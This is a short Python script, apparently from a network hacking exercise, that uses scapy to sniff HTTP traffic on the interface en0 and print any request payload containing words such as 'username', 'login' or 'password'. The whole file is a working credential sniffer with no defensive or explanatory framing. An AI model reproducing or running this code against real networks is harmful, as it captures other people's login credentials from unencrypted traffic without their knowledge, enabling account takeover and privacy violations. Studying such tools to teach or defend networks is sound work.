#!usr/bin/env python

import scapy.all as scapy
from scapy_http import http


def sniff(interface):
    scapy.sniff(iface= interface, store= False, prn= process_sniffed_packet)

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            keywords = ['username', 'user', 'login', 'password', 'pass']
            for word in keywords:
                if word in load:
                    print(load)

sniff("en0")